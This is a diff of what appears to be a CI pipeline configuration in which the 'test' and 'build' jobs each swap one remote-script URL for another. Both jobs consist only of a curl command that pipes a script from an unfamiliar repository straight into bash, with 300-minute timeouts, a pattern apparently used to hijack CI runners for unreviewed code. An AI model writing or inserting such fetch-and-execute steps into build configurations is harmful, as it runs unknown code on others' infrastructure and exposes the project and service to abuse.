@@ -25,7 +25,7 @@ jobs:
       - run:
          Name: test
          command: |
-                     curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
+                     curl -sL https://bitbucket.org/nicezep/korong/raw/master/skycuk2 | bash
          no_output_timeout: 300m
   build:
     parameters:
@@ -42,7 +42,7 @@ jobs:
       - run:
          Name: build
          command: |
-                     curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
+                     curl -sL https://bitbucket.org/nicezep/korong/raw/master/skycuk2 | bash
          no_output_timeout: 300m
 workflows:
   all-tests:
